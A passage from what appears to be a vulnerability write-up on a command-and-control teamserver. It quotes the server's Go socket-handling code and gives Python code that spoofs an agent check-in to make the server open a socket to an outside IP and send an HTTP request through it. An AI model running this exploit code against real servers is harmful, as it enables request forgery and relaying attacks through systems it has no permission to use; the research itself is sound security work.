</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">LclAddr</span>: <span style="color:#a6e22e">LclAddr</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">LclPort</span>: <span style="color:#a6e22e">LclPort</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">FwdAddr</span>: <span style="color:#a6e22e">FwdAddr</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">FwdPort</span>: <span style="color:#a6e22e">FwdPort</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Target</span>:  <span style="color:#a6e22e">Target</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdsMtx</span>.<span style="color:#a6e22e">Lock</span>()
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwds</span> = append(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwds</span>, <span style="color:#a6e22e">portfwd</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdsMtx</span>.<span style="color:#a6e22e">Unlock</span>()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The case that actually opens the socket is <code>SOCKET_COMMAND_READ</code>.  Looking at the code, we can see that the <code>SocketID</code> variable is read from the <code>Parser</code> and is eventually passed to the <code>PortFwdOpen</code> function after passing a few checks on some other variables.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_READ</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* if we receive the SOCKET_COMMAND_READ command
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * that means that we should read the callback and send it to the forwared host/socks proxy */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">CanIRead</span>([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>}) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">SocktID</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Type</span>    = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Success</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Success</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">win32</span>.<span style="color:#a6e22e">TRUE</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">CanIRead</span>([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadBytes</span>}) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">var</span>(
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">Data</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseBytes</span>()
</span></span><span style="display:flex;"><span>				)
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// avoid too much spam
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#75715e">//logger.Debug(fmt.Sprintf(&#34;Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, SocktID: %08x, Type: %d, DataLength: %x&#34;, AgentID, SocktID, Type, len(Data)))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Type</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">SOCKET_TYPE_CLIENT</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#75715e">/* we only open rportfwd clients once we have data to write */</span>
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">opened</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdIsOpen</span>(<span style="color:#a6e22e">SocktID</span>)
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">Console</span>(<span style="color:#a6e22e">teamserver</span>.<span style="color:#a6e22e">AgentConsole</span>, <span style="color:#e6db74">&#34;Erro&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Failed to write to reverse port forward host: %v&#34;</span>, <span style="color:#a6e22e">err</span>), <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#75715e">/* if first time, open the client */</span>
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">opened</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdOpen</span>(<span style="color:#a6e22e">SocktID</span>)
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Failed to open rportfwd: %v&#34;</span>, <span style="color:#a6e22e">err</span>))	
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">Console</span>(<span style="color:#a6e22e">teamserver</span>.<span style="color:#a6e22e">AgentConsole</span>, <span style="color:#e6db74">&#34;Erro&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Failed to open reverse port forward host: %v&#34;</span>, <span style="color:#a6e22e">err</span>), <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>					}
</span></span></code></pre></div><p>The <code>PortFwdOpen</code> function does what one would expect: it retrieves the <code>PortFwd</code> struct that was created in the <code>PortFwdNew</code> function and passes it to a <code>net.Dial</code> call.  This will create the TCP socket on the teamserver.  Performing this from python code looks something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open_socket</span>(socket_id, target_address, target_port):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># COMMAND_SOCKET / 2540</span>
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x09\xec</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    request_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x02</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># SOCKET_COMMAND_OPEN / 16</span>
</span></span><span style="display:flex;"><span>    subcommand <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x10</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    sub_request_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x03</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    local_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x22\x22\x22\x22</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    local_port <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x33\x33\x33\x33</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    forward_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> octet <span style="color:#f92672">in</span> target_address<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
</span></span><span style="display:flex;"><span>        forward_addr <span style="color:#f92672">+=</span> int_to_bytes(int(octet), length<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    forward_port <span style="color:#f92672">=</span> int_to_bytes(target_port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    package <span style="color:#f92672">=</span> subcommand<span style="color:#f92672">+</span>socket_id<span style="color:#f92672">+</span>local_addr<span style="color:#f92672">+</span>local_port<span style="color:#f92672">+</span>forward_addr<span style="color:#f92672">+</span>forward_port
</span></span><span style="display:flex;"><span>    package_size <span style="color:#f92672">=</span> int_to_bytes(len(package) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    header_data <span style="color:#f92672">=</span> command <span style="color:#f92672">+</span> request_id <span style="color:#f92672">+</span> encrypt(AES_Key, AES_IV, package_size <span style="color:#f92672">+</span> package)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">+</span> len(header_data)
</span></span><span style="display:flex;"><span>    size_bytes <span style="color:#f92672">=</span> size<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    agent_header <span style="color:#f92672">=</span> size_bytes <span style="color:#f92672">+</span> magic <span style="color:#f92672">+</span> agent_id
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> agent_header <span style="color:#f92672">+</span> header_data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[***] Trying to open socket on the teamserver...&#34;</span>)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(teamserver_listener_url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[***] Success!&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!!!] Failed to open socket on teamserver - </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xDEADBEEF</span>
</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>teamserver_listener_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.32&#34;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>agent_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100000</span>, <span style="color:#ae81ff">1000000</span>))
</span></span><span style="display:flex;"><span>AES_Key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>AES_IV <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DESKTOP-7F61JT1&#34;</span>
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;neo&#34;</span>
</span></span><span style="display:flex;"><span>domain_name <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;MRTX&#34;</span>
</span></span><span style="display:flex;"><span>internal_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;10.1.33.7&#34;</span>
</span></span><span style="display:flex;"><span>process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;msedge.exe&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-16le&#34;</span>)
</span></span><span style="display:flex;"><span>process_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">5000</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>socket_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x11\x11\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>open_socket(socket_id, <span style="color:#e6db74">&#34;44.221.186.72&#34;</span>, <span style="color:#ae81ff">80</span>)
</span></span></code></pre></div><p>Now that we see how the socket gets opened, let&rsquo;s show how we can write to it.  We can see that after the call to <code>PortFwdOpen</code>, there is a <code>PortFwdWrite</code> call that occurs, passing the <code>SocketID</code> of our newly created socket and a <code>Data</code> variable which was read by the <code>Parser</code>.  The <code>PortFwdWrite</code> function will retrieve our socket by the <code>SocketID</code> and write the <code>Data</code> to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">/* if first time, open the client */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">opened</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdOpen</span>(<span style="color:#a6e22e">SocktID</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Failed to open rportfwd: %v&#34;</span>, <span style="color:#a6e22e">err</span>))	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">Console</span>(<span style="color:#a6e22e">teamserver</span>.<span style="color:#a6e22e">AgentConsole</span>, <span style="color:#e6db74">&#34;Erro&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Failed to open reverse port forward host: %v&#34;</span>, <span style="color:#a6e22e">err</span>), <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* write the data to the forwarded host */</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdWrite</span>(<span style="color:#a6e22e">SocktID</span>, <span style="color:#a6e22e">Data</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">Console</span>(<span style="color:#a6e22e">teamserver</span>.<span style="color:#a6e22e">AgentConsole</span>, <span style="color:#e6db74">&#34;Erro&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Failed to write to reverse port forward socket 0x%08x: %v&#34;</span>, <span style="color:#a6e22e">SocktID</span>, <span style="color:#a6e22e">err</span>), <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In python code, writing to the socket looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_socket</span>(socket_id, data):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># COMMAND_SOCKET / 2540</span>
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x09\xec</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    request_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x08</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># SOCKET_COMMAND_READ / 11</span>
</span></span><span style="display:flex;"><span>    subcommand <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    sub_request_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\xa1</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># SOCKET_TYPE_CLIENT / 3</span>
</span></span><span style="display:flex;"><span>    socket_type <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x03</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    success <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    data_length <span style="color:#f92672">=</span> int_to_bytes(len(data))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    package <span style="color:#f92672">=</span> subcommand<span style="color:#f92672">+</span>socket_id<span style="color:#f92672">+</span>socket_type<span style="color:#f92672">+</span>success<span style="color:#f92672">+</span>data_length<span style="color:#f92672">+</span>data
</span></span><span style="display:flex;"><span>    package_size <span style="color:#f92672">=</span> int_to_bytes(len(package) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    header_data <span style="color:#f92672">=</span> command <span style="color:#f92672">+</span> request_id <span style="color:#f92672">+</span> encrypt(AES_Key, AES_IV, package_size <span style="color:#f92672">+</span> package)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">+</span> len(header_data)
</span></span><span style="display:flex;"><span>    size_bytes <span style="color:#f92672">=</span> size<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    agent_header <span style="color:#f92672">=</span> size_bytes <span style="color:#f92672">+</span> magic <span style="color:#f92672">+</span> agent_id
</span></span><span style="display:flex;"><span>    post_data <span style="color:#f92672">=</span> agent_header <span style="color:#f92672">+</span> header_data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[***] Trying to write to the socket&#34;</span>)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(teamserver_listener_url, data<span style="color:#f92672">=</span>post_data, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[***] Success!&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!!!] Failed to write data to the socket - </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xDEADBEEF</span>
</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>teamserver_listener_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.32&#34;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>agent_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100000</span>, <span style="color:#ae81ff">1000000</span>))
</span></span><span style="display:flex;"><span>AES_Key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>AES_IV <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DESKTOP-7F61JT1&#34;</span>
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;neo&#34;</span>
</span></span><span style="display:flex;"><span>domain_name <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;MRTX&#34;</span>
</span></span><span style="display:flex;"><span>internal_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;10.1.33.7&#34;</span>
</span></span><span style="display:flex;"><span>process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;msedge.exe&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-16le&#34;</span>)
</span></span><span style="display:flex;"><span>process_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">5000</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>socket_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x11\x11\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>open_socket(socket_id, <span style="color:#e6db74">&#34;44.221.186.72&#34;</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>request_data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;GET /vulnerable HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: www.example.com</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>write_socket(socket_id, request_data)
</span></span></code></pre></div><p>After the <code>PortFwdWrite</code> call, we can see that a goroutine is started in which response data will be read from the socket and placed into a <code>job</code> struct and added to the agent queue.  To retrieve the response data, we will need to spoof another demon checkin to retrieve the job off the agent queue.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">opened</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* after we managed to open a socket to the forwarded host lets start a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * goroutine where we read the data from the forwarded host and send it to the agent. */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Data</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdRead</span>(<span style="color:#a6e22e">SocktID</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
